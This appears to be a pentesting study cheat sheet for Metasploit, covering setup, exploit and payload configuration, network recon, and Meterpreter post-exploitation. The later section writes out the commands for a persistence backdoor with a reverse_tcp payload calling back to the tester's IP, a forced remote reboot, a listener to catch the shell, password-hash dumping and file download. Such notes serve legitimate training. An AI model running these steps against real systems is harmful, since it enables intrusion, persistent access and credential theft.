---
description: >-
  An Open-Source framework used for PenTesting & Exploit Dev. + Has wide array
  of exploits/attacks and can be used to automate your own exploits.
---

# 🔬Metasploit

It has many interfaces to use :

* **msfconsole** - an interactive command-line like interface&#x20;
* **msfcli** - a literal Linux command line interface&#x20;
* [**Armitage**](http://www.hackers-arise.com/single-post/2017/04/18/Metasploit-Basics-Part-6-The-Armitage-Metasploit-User-Interface) - a GUI-based third party application&#x20;
* **msfweb** - browser based interface

**MSFConsole** basic workflow to exploit a target will be:

1. Identify a Vulnerable service.
2. Search for a proper exploit for that service.
3. Load + Config the Exploit.
4. Load + Config the Payload.
5. Run the Exploit code & get access to the vulnerable machine.

#### Update Metasploit:

```
msfupdate //no longer supported as it's part of the os
apt update; apt install metasploit-framework 
```

## 🥇Basic initialization:

### [Using DB](https://www.offensive-security.com/metasploit-unleashed/using-databases/), Start the PostgreSQL DB (store + faster search) + MS service:

```
systemctl start postgresql && sudo msfdb init
 sudo /etc/init.d/postgresql start //or use this
```

### Start MSFConsole

```
sudo msfconsole
db_status //make sure DB is conn.

db_import <path> //import hosts 
db_export <back_up_path> //back up your Db
```

#### Workspaces:

```
workspace //see all the workspaces
workspace -a <new_ws>
workspace -d <remove_ws>
```

#### Search for a module:

```
search <type>:<module>
```

> 4200+ modules (exploits, auxiliary, payloads ,encoders, post, nops, evasion)

#### Show help or module:

```
show -h
show <module>
```

## 🐱‍👤Basic Exploitation:

### Use an Exploit:

```
use exploit/<path_to_exploit>
check //to see if the exploit is vul
```

#### Go Back after choosing something:

```
back
```

#### show info about selected module:

```
info
```

#### check the module options:

```
show options
```

#### Config an option:

```
set <option> <value>
```

{% hint style="info" %}
To run exploits Payload is needed. Payloads are pieces of code injected by an exploit into machine/service. we use them to get:\
\- get OS shell.\
\- a VNC/RDP connection.\
\- a [Meterpreter ](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)shell.\
\- execute own own code/application

\`show payloads\` while using an exploit will show only working payload for that exploit
{% endhint %}

### Set a Payload (after you used your exploit):

```
set payload <payload_name>
show options //check all the options to config your payload
```

### Launch the Exploit:

```
exploit
```

> check exploit -h for extra info like (-e for encoding).

## 🔍Recon with Metasploit:

### Search with Hosts ARP:

```
use auxiliary/scanner/discovery/arp_sweep
```

```
set RHOSTS <Net_to_Scan>
run
```

> Doesn't show your own machine IP.

### Port scan:

```
use auxiliary/scanner/portscan/tcp
```

```
set RHOSTS <Host>
run
```

### Nmap Scan inside MSFConsole:

```
nmap -A <Ip_host> //yes, you can run it inside msfconsole 
```

### Nmap Vulnerability assessment:

```
nmap --script <ex:vuln> --script-args=unsafe=1 <Target_Host_IP>
```

> the script will tell you if a certain service is vul or not use the name of the vul along with `search <vuk_name>` to fine exploits and procedure with how to exploit above.\
> regarding mentioned in ePTS: smb-check-wuls.nse [check this out. ](https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap/119968)

## Meterpreter

### Obtain SYSTEM privileges on the machine

check before and after `getuid`&#x20;

```
getsystem
```

### Install a backdoor

#### remember your session ID:

```
sessions -l
```

#### many way to achieve persistence one way is this:

```
use exploit/windows/local/persistence
```

configurate:

```
use exploit/windows/local/persistence
use exploit/windows/local/persistence_service //better

set reg_name backdoor
set exe_name backdoor
set startup SYSTEM
set session 1
set payload windows/meterpreter/reverse_tcp
set exitfunc process
set lhost <My_IP>
set lport 5555
set DisablePayloadHandler false
```

Note that we will also need to enable the Payload Handler in order to receive the connection, as follows:

```
set DisablePayloadHandler false
```

exploit now:

```
exploit //if the backdoor doesn't start immediately, use "exploit -j" instead
```

notice backdoor installed successfully but didn't un we need the target to reboot to work so we will go back to the Meterpreter session and reboot it like this:

```
sessions -i 1
shell
shutdown /r /f
```

> instead of session 1 you can pick your own session if you got many against multiple targets.\
> the ctr+z twice to get out and

check if any active listeners are running:

```
jobs -l
```

let's create a Metasploit listener to receive the connection. The payload has to be of the same type as the backdoor that was placed on the victim system:

```
use exploit/multi/handler
set lhost <My_IP>
set lport 5555
set payload windows/meterpreter/reverse_tcp
exploit -j
```

check your sessions you should find your backdoor:

```
sessions -l
sessions -i <session_id>
```

### make sure you get system privilege then[ dumb hashes](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf) to crack them with john The Ripper:

```
getsystem
hashdump
```

![explaining the hashdump output.](<../../.gitbook/assets/image (32).png>)

### Search and Download files:

```
search -f <file_name>
download '<output_location>' <Local_PC_path>
```

## Killing all task

to kill all the Metasploit tasks and sessions:

```
sessions -k
jobs -s
```

